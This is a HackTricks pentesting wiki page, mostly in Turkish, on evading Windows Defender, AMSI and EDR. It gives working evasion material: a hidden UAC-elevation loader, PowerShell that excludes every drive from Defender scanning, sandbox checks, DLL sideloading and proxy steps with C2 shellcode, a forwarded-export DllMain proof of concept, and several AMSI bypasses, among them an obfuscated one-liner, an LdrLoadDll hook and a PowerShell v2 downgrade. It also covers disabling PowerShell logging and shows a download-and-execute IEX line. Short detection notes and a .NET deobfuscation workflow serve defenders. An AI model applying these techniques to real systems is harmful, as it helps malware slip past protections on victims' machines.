# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Bu sayfa şu kişi tarafından yazıldı** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Defender'ı Durdur

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ın çalışmasını durdurmak için bir araç.
- [no-defender](https://github.com/es3n1n/no-defender): Başka bir AV'yi taklit ederek Windows Defender'ın çalışmasını durdurmak için bir araç.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Defender ile uğraşmadan önce kurulum tarzı UAC yemi

Oyun hileleri kılığına giren public loaders genellikle imzasız Node.js/Nexe installer'ları olarak gelir; bunlar önce **kullanıcıdan yükseltme talep eder** ve ancak ondan sonra Defender'ı etkisiz hale getirir. Akış basittir:

1. Yönetici bağlamını `net session` ile test edin. Komut yalnızca çağıran kişi admin haklarına sahip olduğunda başarılı olur; dolayısıyla başarısızlık loader'ın standart kullanıcı olarak çalıştığını gösterir.
2. Beklenen UAC onay istemini tetiklemek için orijinal komut satırını koruyarak hemen kendini `RunAs` verb'ü ile yeniden başlatır.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Kurbanlar zaten “cracked” yazılım yüklediklerine inandıkları için, istem genellikle kabul edilir, bu da kötü amaçlı yazılıma Defender'ın politikasını değiştirmek için ihtiyaç duyduğu izinleri verir.

### Her sürücü harfi için kapsamlı `MpPreference` istisnaları

Yükseltildikten sonra, GachiLoader-style chains hizmeti tamamen devre dışı bırakmak yerine Defender'ın gözetim boşluklarını maksimize eder. Loader önce GUI izleyicisini (`taskkill /F /IM SecHealthUI.exe`) sonlandırır ve ardından **son derece geniş istisnalar** uygular; böylece her kullanıcı profili, sistem dizini ve çıkarılabilir disk taranamaz hale gelir:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Ana bulgular:

- Döngü her bağlanmış dosya sistemini (D:\, E:\, USB stickler, vb.) gezer, bu yüzden **diskte herhangi bir yere bırakılacak gelecekteki payload göz ardı edilir**.
- `.sys` uzantısı hariç tutulması ileriye dönük—saldırganlar daha sonra imzasız sürücüleri yükleme seçeneğini Defender'a tekrar dokunmadan saklar.
- Tüm değişiklikler `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` altında yer alır, bu da sonraki aşamaların hariç tutmaların devam edip etmediğini doğrulamasına veya UAC'yi yeniden tetiklemeden bunları genişletmesine olanak verir.

Hiçbir Defender servisi durdurulmadığı için, temel sağlık kontrolleri “antivirüs aktif” raporu vermeye devam eder; oysa gerçek zamanlı inceleme bu yolları hiç kontrol etmez.

## **AV Atlatma Metodolojisi**

Şu anda, AV'ler bir dosyanın kötü amaçlı olup olmadığını kontrol etmek için farklı yöntemler kullanır: statik tespit, dinamik analiz ve daha gelişmiş EDR'ler için davranışsal analiz.

### **Statik tespit**

Statik tespit, bir ikili veya script içindeki bilinen kötü amaçlı string'leri veya byte dizilerini işaretleyerek ve ayrıca dosyanın kendisinden bilgi çıkararak (ör. file description, company name, digital signatures, icon, checksum, vb.) gerçekleştirilir. Bu, bilinen açık kaynak araçlarını kullanmanın sizi daha kolay yakalatabileceği anlamına gelir, çünkü muhtemelen analiz edilmiş ve kötü amaçlı olarak işaretlenmişlerdir. Bu tür tespiti aşmanın birkaç yolu vardır:

- **Şifreleme**

İkiliyi şifrelerseniz, AV programınızın tespit etmesinin bir yolu olmaz, ancak programı bellekte deşifre edip çalıştırmak için bir tür loader gerekecektir.

- **Obfuskasyon**

Bazen AV'yi aşmak için ikilinizde veya scriptinizde bazı string'leri değiştirmek yeterlidir, ancak bu, neyi obfuskasyona tabi tutmak istediğinize bağlı olarak zaman alıcı bir işlem olabilir.

- **Özel araçlar**

Kendi araçlarınızı geliştirirseniz, bilinen kötü imzalar olmayacaktır, ancak bu çok zaman ve emek gerektirir.

[!TIP]
Windows Defender statik tespitiyle kontrol etmek için iyi bir araç [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)'tir. Temelde dosyayı birden fazla segmente böler ve Defender'dan her birini ayrı ayrı taramasını ister; bu şekilde ikilinizde hangi string'lerin veya byte dizilerinin işaretlendiğini tam olarak söyleyebilir.

Pratik AV Atlatma hakkında bu [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)'i şiddetle öneririm.

### **Dinamik analiz**

Dinamik analiz, AV'nin ikilinizi bir sandbox içinde çalıştırıp kötü amaçlı etkinlikleri izlemesiyle gerçekleşir (ör. tarayıcı şifrelerinizi çözmeye ve okumaya çalışmak, LSASS üzerinde minidump almak, vb.). Bu kısım biraz daha zorlu olabilir, ancak sandbox'ları atlatmak için yapabileceğiniz bazı şeyler şunlardır:

- **Çalışmadan önce sleep (bekleme)** Uygulamanın nasıl implemente edildiğine bağlı olarak, AV'nin dinamik analizini atlatmanın harika bir yolu olabilir. AV'lerin kullanıcı iş akışını kesmemek için dosyaları taramak üzere çok kısa bir zamanı vardır, bu yüzden uzun beklemeler ikililerin analizini bozabilir. Sorun şu ki, birçok AV'nin sandbox'ı sleep'i atlayabilir.
- **Makinenin kaynaklarını kontrol etme** Genellikle sandbox'ların çalışacak çok az kaynağı vardır (ör. < 2GB RAM), aksi takdirde kullanıcının makinesini yavaşlatabilirler. Burada çok yaratıcı olabilirsiniz; örneğin CPU'nun sıcaklığını veya fan hızlarını kontrol etmek gibi—her şey sandbox içinde implemente edilmiş olmayabilir.
- **Makineye özgü kontroller** Hedefinizin workstation'ı "contoso.local" domain'ine bağlı bir kullanıcıysa, bilgisayarın domain'ini kontrol edip sizin belirttiğiniz domain ile eşleşip eşleşmediğine bakabilirsiniz; eşleşmiyorsa programınızı sonlandırabilirsiniz.

Microsoft Defender'ın Sandbox bilgisayar adının HAL9TH olduğu ortaya çıktı; bu yüzden kötü amaçlı yazılımınız detonasyondan (çalıştırmadan) önce bilgisayar adını kontrol edebilir; ad HAL9TH ise Defender'ın sandbox'ındasınız demektir, programınızı sonlandırabilirsiniz.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>kaynak: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandbox'lara karşı gitmek için @mgeeky'den bazı diğer çok iyi ipuçları

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanalı</p></figcaption></figure>

Daha önce bu yazıda da söylediğimiz gibi, **public tools** sonunda **algılanacaktır**, bu yüzden kendinize şu soruyu sormalısınız:

Örneğin, LSASS'i dump etmek istiyorsanız, **gerçekten mimikatz kullanmanız gerekiyor mu**? Yoksa LSASS'i dump eden daha az bilinen farklı bir proje kullanabilir misiniz?

Doğru cevap muhtemelen ikincisidir. Örneğin mimikatz, AV'ler ve EDR'ler tarafından büyük olasılıkla en çok işaretlenen kötü amaçlı yazılımlardan biridir; proje kendisi süper havalı olsa da, AV'leri atlatmak için onunla çalışmak bir kabus olabilir, bu yüzden başarmaya çalıştığınız şey için alternatiflere bakın.

[!TIP]
Payload'larınızı atlatma için değiştirirken, Defender'da **otomatik örnek gönderimini kapattığınızdan** emin olun ve lütfen ciddi şekilde, **VIRUSTOTAL'A YÜKLEMEYİN** eğer hedefiniz uzun vadede atlatma sağlamaksa. Belirli bir AV tarafından payload'ınızın tespit edilip edilmediğini kontrol etmek istiyorsanız, onu bir VM'e kurun, otomatik örnek gönderimini kapatmaya çalışın ve sonuçtan memnun olana kadar orada test edin.

## EXE'ler vs DLL'ler

Mümkün olduğunda her zaman **kaçınma için DLL kullanmayı önceliklendirin**; deneyimlerime göre, DLL dosyaları genellikle **çok daha az tespit ediliyor** ve analiz ediliyor, bu yüzden bazı durumlarda tespiti önlemek için kullanabileceğiniz çok basit bir hiledir (elbette payload'ınız DLL olarak çalıştırılabilecek bir yol sağlıyorsa).

Aşağıdaki görüntüde görüldüğü gibi, bir Havoc DLL payload'unun antiscan.me'de tespit oranı 4/26 iken, EXE payload'unun tespit oranı 7/26'dır.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me üzerindeki normal bir Havoc EXE payload ile normal bir Havoc DLL karşılaştırması</p></figcaption></figure>

Şimdi DLL dosyalarıyla çok daha gizli olmak için kullanabileceğiniz bazı hileleri göstereceğiz.

## DLL Sideloading & Proxying

**DLL Sideloading**, loader'ın kullandığı DLL arama sırasından faydalanarak hedef uygulama ile kötü amaçlı payload(ları) birbirinin yanına yerleştirir.

DLL Sideloading'e duyarlı programları [Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki PowerShell script'i kullanarak kontrol edebilirsiniz:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Bu komut "C:\Program Files\\" içinde DLL hijacking'e yatkın programların listesini ve yüklemeye çalıştıkları DLL dosyalarını çıkartacaktır.

Kesinlikle **DLL Hijackable/Sideloadable programs'ı kendiniz incelemenizi** öneririm; bu teknik doğru uygulandığında oldukça gizlidir, ancak kamuya açık bilinen DLL Sideloadable programları kullanırsanız kolayca yakalanabilirsiniz.

Sadece bir programın yüklemesini beklediği isimde kötü amaçlı bir DLL yerleştirmek payload'unuzu yüklemez; çünkü program o DLL içinde bazı belirli fonksiyonları bekler. Bu sorunu çözmek için **DLL Proxying/Forwarding** adında başka bir teknik kullanacağız.

**DLL Proxying**, bir programın proxy (ve kötü amaçlı) DLL'den orijinal DLL'e yaptığı çağrıları iletir; böylece programın işlevselliği korunur ve payload'unuzun yürütülmesini yönetebilirsiniz.

[@flangvik](https://twitter.com/Flangvik/)'in [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini kullanacağım.

İzlediğim adımlar şunlardır:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Son komut bize 2 dosya verecek: bir DLL kaynak kodu şablonu ve yeniden adlandırılmış orijinal DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Bunlar elde edilen sonuçlar:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem shellcode'umuz ( [SGN](https://github.com/EgeBalci/sgn) ile encode edilmiş) hem de proxy DLL'imiz [antiscan.me](https://antiscan.me) üzerinde 0/26 Detection rate'e sahip! Bunu bir başarı olarak nitelendiririm.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading hakkında daha derinlemesine öğrenmek için [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) ve ayrıca [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) izlemenizi **şiddetle tavsiye ederim**.

### İletilen İhracatların Kötüye Kullanımı (ForwardSideLoading)

Windows PE modülleri gerçekte "forwarders" olan fonksiyonları export edebilir: kodu işaret etmek yerine export girdisi `TargetDll.TargetFunc` biçiminde bir ASCII dizesi içerir. Bir çağıran export'ı çözdüğünde, Windows loader şu işlemleri yapar:

- Eğer henüz yüklenmediyse `TargetDll`'i yükler
- Ondan `TargetFunc`'ı çözer

Anlaşılması gereken temel davranışlar:
- Eğer `TargetDll` bir KnownDLL ise, korumalı KnownDLLs ad alanından sağlanır (ör. ntdll, kernelbase, ole32).
- Eğer `TargetDll` bir KnownDLL değilse, normal DLL arama sırası kullanılır; bu sıra, forward çözümü yapan modülün bulunduğu dizini de içerir.

Bu, dolaylı bir sideloading primitive'ı sağlar: export ettiği fonksiyon non-KnownDLL bir modül adına forward edilmiş olan imzalı (signed) bir DLL bulun, sonra o signed DLL'i attacker-controlled ve forward edilen hedef modülle tam aynı ada sahip bir DLL ile aynı dizine koyun. Forward edilmiş export çağrıldığında, loader forward'ı çözer ve DLL'inizi aynı dizinden yükleyip DllMain'inizi çalıştırır.

Windows 11'de gözlemlenen örnek:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` bir KnownDLL değildir, bu yüzden normal arama sırasına göre çözülür.

PoC (kopyala-yapıştır):
1) İmzalı sistem DLL'ini yazılabilir bir klasöre kopyalayın
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Aynı klasöre kötü amaçlı bir `NCRYPTPROV.dll` bırakın. Kod yürütmesi elde etmek için minimal bir DllMain yeterlidir; DllMain'i tetiklemek için forwarded function'ı uygulamanıza gerek yoktur.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) İmzalı bir LOLBin ile forward işlemini tetikleyin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (imzalı) side-by-side `keyiso.dll` (imzalı) yükler
- `KeyIsoSetAuditingInterface` çözülürken, yükleyici ileri yönlendirmeyi `NCRYPTPROV.SetAuditingInterface`'e takip eder
- Yükleyici daha sonra `C:\test`'ten `NCRYPTPROV.dll`'yi yükler ve onun `DllMain`'ini çalıştırır
- Eğer `SetAuditingInterface` uygulanmamışsa, `DllMain` zaten çalıştıktan sonra ancak "missing API" hatası alırsınız

Hunting tips:
- Hedef modül KnownDLL olmayan forwarded exports'a odaklanın. KnownDLLs, `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` altında listelenir.
- Forwarded exports'u şu tür tooling ile enumerate edebilirsiniz:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Adayları aramak için Windows 11 forwarder envanterine bakın: https://hexacorn.com/d/apis_fwd.txt

Tespit/koruma fikirleri:
- LOLBins'i (ör. rundll32.exe) izleyin: sistem dışı yollarından (non-system paths) imzalı DLL'lerin yüklenmesi ve sonrasında aynı temel ada sahip non-KnownDLLs'lerin o dizinden yüklenmesi durumları
- Kullanıcı tarafından yazılabilir yollar altında şu gibi process/module zincirleri için uyarı verin: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll`
- Kod bütünlüğü politikalarını (WDAC/AppLocker) uygulayın ve uygulama dizinlerinde write+execute iznini reddedin

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze'i kullanarak shellcode'unuzu gizli bir şekilde yükleyip çalıştırabilirsiniz.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Atlatma (evasion) aslında bir kedi-fare oyunudur; bugün işe yarayan şey yarın tespit edilebilir. Bu yüzden mümkünse tek bir araca bağlı kalmayın, birden fazla atlatma tekniğini zincirlemeyi deneyin.

## AMSI (Anti-Malware Scan Interface)

AMSI, "fileless malware"ı önlemek için oluşturuldu. Başlangıçta, AV'ler yalnızca disk üzerindeki **dosyaları tarayabiliyordu**, bu yüzden bir how payload'ı **doğrudan bellekte** çalıştırmayı başarabiliyorsanız, AV bunun önüne geçemiyordu çünkü yeterli görünürlüğe sahip değildi.

AMSI özelliği Windows'un şu bileşenlerine entegre edilmiştir.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Bu, antivirüs çözümlerinin script içeriğini şifresiz ve obfuskasyonsuz bir şekilde açığa çıkararak script davranışını incelemesine olanak tanır.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Dikkat edin, nasıl `amsi:` öne ekleniyor ve ardından script'in çalıştığı executable'ın yolu geliyor; bu durumda powershell.exe

Herhangi bir dosyayı diske bırakmadık, ancak AMSI yüzünden bellekte yakalandık.

Dahası, **.NET 4.8**'den itibaren C# kodu da AMSI üzerinden çalıştırılıyor. Bu, `Assembly.Load(byte[])` ile bellek içi çalıştırmayı bile etkiliyor. Bu yüzden AMSI'den kaçınmak istiyorsanız, bellek içi çalıştırma için daha düşük .NET sürümleri (ör. 4.7.2 veya daha düşük) kullanmanız önerilir.

AMSI'nin etrafından dolaşmanın birkaç yolu vardır:

- **Obfuscation**

AMSI ağırlıklı olarak statik tespitlerle çalıştığı için, yüklemeye çalıştığınız scriptleri değiştirmek tespitten kaçınmak için iyi bir yol olabilir.

Ancak AMSI, birden fazla katman olsa bile scriptleri unobfuscate etme yeteneğine sahiptir; bu yüzden obfuscation nasıl yapıldığına bağlı olarak kötü bir seçenek olabilir. Bu, atlatmayı o kadar da basit yapmaz. Yine de bazen yapmanız gereken tek şey birkaç değişken adını değiştirmektir; bu yüzden ne kadar işaretlendiğine bağlıdır.

- **AMSI Bypass**

AMSI, powershell (ayrıca cscript.exe, wscript.exe, vb.) sürecine bir DLL yükleyerek uygulanır; bu yüzden ayrıcalıksız bir kullanıcı olarak çalışırken bile kolayca müdahale etmek mümkündür. AMSI uygulamasındaki bu kusur nedeniyle, araştırmacılar AMSI taramasından kaçınmanın birden fazla yolunu bulmuştur.

**Hata Oluşturma**

AMSI başlatılmasının başarısız olmasını sağlamak (amsiInitFailed), mevcut süreç için hiçbir taramanın başlatılmamasıyla sonuçlanır. Bu ilk olarak [Matt Graeber](https://twitter.com/mattifestation) tarafından açıklanmıştı ve Microsoft daha geniş kullanımını önlemek için bir imza geliştirdi.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Mevcut powershell süreci için AMSI'yi kullanılamaz hale getirmek sadece bir satır powershell kodu gerekiyordu. Bu satır elbette AMSI tarafından tespit edildi, bu yüzden bu tekniği kullanmak için bazı değişiklikler gerekiyor.

İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)ten aldığım değiştirilmiş bir AMSI bypassı.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Bu teknik ilk olarak [@RastaMouse](https://twitter.com/_RastaMouse/) tarafından keşfedildi ve amsi.dll içindeki kullanıcı tarafından sağlanan girdiyi taramaktan sorumlu "AmsiScanBuffer" fonksiyonunun adresinin bulunmasını ve E_INVALIDARG kodunu döndürecek şekilde üzerine yazılmasını içerir; bu şekilde gerçek taramanın sonucu 0 dönecek ve bu da temiz sonuç olarak yorumlanır.

> [!TIP]
> Lütfen daha detaylı açıklama için [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) sayfasını okuyun.

AMSI'yi bypass etmek için powershell ile kullanılan başka birçok teknik de vardır, daha fazlasını öğrenmek için [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) ve [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) sayfalarına bakın.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI, yalnızca `amsi.dll` mevcut iş parçacığına yüklendikten sonra başlatılır. Dil bağımsız ve sağlam bir bypass yöntemi, istenen modül `amsi.dll` olduğunda hata döndüren bir kullanıcı modu hook'unu `ntdll!LdrLoadDll` üzerine yerleştirmektir. Sonuç olarak, AMSI hiç yüklenmez ve o işlem için tarama gerçekleşmez.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notlar
- PowerShell, WScript/CScript ve custom loaders üzerinde çalışır (aksi takdirde AMSI'yi yükleyecek her şey).
- Uzun komut satırı izlerini önlemek için betikleri stdin üzerinden besleyerek çalıştırmayla eşleştirin (`PowerShell.exe -NoProfile -NonInteractive -Command -`).
- LOLBins aracılığıyla yürütülen loaders tarafından kullanıldığı görülmüştür (ör. `regsvr32` `DllRegisterServer` çağırması).

Bu araçlar [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) ayrıca AMSI'yi baypas etmek için script de üretir.

**Tespit edilen imzayı kaldır**

Mevcut işlemin belleğinden tespit edilen AMSI imzasını kaldırmak için **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** ve **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gibi araçları kullanabilirsiniz. Bu araç, AMSI imzası için mevcut işlemin belleğini tarar ve ardından imzayı NOP talimatlarıyla üzerine yazarak bellekten etkili bir şekilde kaldırır.

**AMSI kullanan AV/EDR ürünleri**

AMSI kullanan AV/EDR ürünlerinin bir listesini **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** adresinde bulabilirsiniz.

**PowerShell sürüm 2'yi kullanın**
PowerShell sürüm 2'yi kullanırsanız, AMSI yüklenmez; böylece betiklerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging, bir sistemde çalıştırılan tüm PowerShell komutlarını kaydetmenize olanak sağlayan bir özelliktir. Denetleme ve sorun giderme amaçları için faydalı olabilir, ancak tespitten kaçınmak isteyen saldırganlar için de **bir sorun oluşturabilir**.

PowerShell logging'i atlatmak için aşağıdaki teknikleri kullanabilirsiniz:

- **Disable PowerShell Transcription and Module Logging**: Bu amaç için [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) gibi bir araç kullanabilirsiniz.
- **Use Powershell version 2**: PowerShell sürüm 2'yi kullanırsanız, AMSI yüklenmez; bu nedenle betiklerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Savunmasız bir PowerShell başlatmak için [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanın (bu, Cobal Strike'dan `powerpick`'in kullandığı yöntemdir).


## Obfuscation

> [!TIP]
> Bazı obfuskasyon teknikleri verileri şifrelemeye dayanır; bu, ikili dosyanın entropisini artırır ve AV'ler ile EDR'lerin bunu tespit etmesini kolaylaştırır. Buna dikkat edin; şifrelemeyi yalnızca hassas veya gizlenmesi gereken kod bölümlerine uygulamayı düşünün.

### Deobfuscating ConfuserEx-Protected .NET Binaries

ConfuserEx 2 (veya ticari forkları) kullanan malware'leri analiz ederken, decompiler'ları ve sandbox'ları engelleyen birden fazla koruma katmanıyla karşılaşmak yaygındır. Aşağıdaki iş akışı, daha sonra dnSpy veya ILSpy gibi araçlarda C#'a decompile edilebilecek neredeyse orijinal bir IL'i güvenilir şekilde **geri yükler**.

1.  Anti-tampering removal – ConfuserEx her *method body*'yi şifreler ve bunları *module* statik yapıcısı (`<Module>.cctor`) içinde çözer. Ayrıca PE checksum'unu patch'ler; böylece herhangi bir değişiklik ikiliyi çökertir. Şifrelenmiş metadata tablolarını bulmak, XOR anahtarlarını kurtarmak ve temiz bir assembly yeniden yazmak için **AntiTamperKiller** kullanın:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Çıktı, kendi unpacker'ınızı oluştururken faydalı olabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.

2.  Symbol / control-flow recovery – *clean* dosyayı **de4dot-cex**'e verin (de4dot'un ConfuserEx farkında fork'u).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profilini seçer  
• de4dot kontrol-akışı flattening'ini geri alır, orijinal namespace'leri, sınıfları ve değişken isimlerini geri yükler ve sabit string'leri çözer.

3.  Proxy-call stripping – ConfuserEx, doğrudan method çağrılarını decompilation'ı daha da bozmak için hafif sarmalayıcılarla (diğer adıyla *proxy calls*) değiştirir. Bunları kaldırmak için **ProxyCall-Remover** kullanın:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Bu adımdan sonra `Convert.FromBase64String` veya `AES.Create()` gibi normal .NET API'lerini, opak sarmalayıcı fonksiyonlar (`Class8.smethod_10`, …) yerine görmelisiniz.

4.  Manual clean-up – ortaya çıkan binary'yi dnSpy altında inceleyin, büyük Base64 blob'larını veya `RijndaelManaged`/`TripleDESCryptoServiceProvider` kullanımını arayarak *gerçek* payload'u bulun. Sıkça malware bunu `<Module>.byte_0` içinde başlatılan TLV-encoded byte array olarak saklar.

Yukarıdaki zincir, kötü amaçlı örneği çalıştırma ihtiyacı olmadan yürütme akışını **geri yükler** — offline bir iş istasyonunda çalışırken kullanışlıdır.

> 🛈  ConfuserEx, örnekleri otomatik triage etmek için IOC olarak kullanılabilecek `ConfusedByAttribute` adında özel bir attribute üretir.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, [LLVM](http://www.llvm.org/) derleme paketinin açık kaynaklı bir fork'unu sağlayarak yazılım güvenliğini artırmak için code obfuscation ve tamper-proofing sunmaktır.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, derleme zamanında herhangi bir dış araç kullanmadan ve derleyiciyi değiştirmeden obfuscated code üretmek için `C++11/14` dilinin nasıl kullanılacağını gösterir.
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework tarafından üretilen obfuscated operations katmanı ekleyerek uygulamayı kırmaya çalışan kişinin işini biraz daha zorlaştırır.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz, .exe, .dll, .sys gibi çeşitli farklı PE dosyalarını obfuscate edebilen bir x64 binary obfuscator'dır.
- [**metame**](https://github.com/a0rtega/metame): Metame, arbitrary executables için basit bir metamorphic code engine'dir.
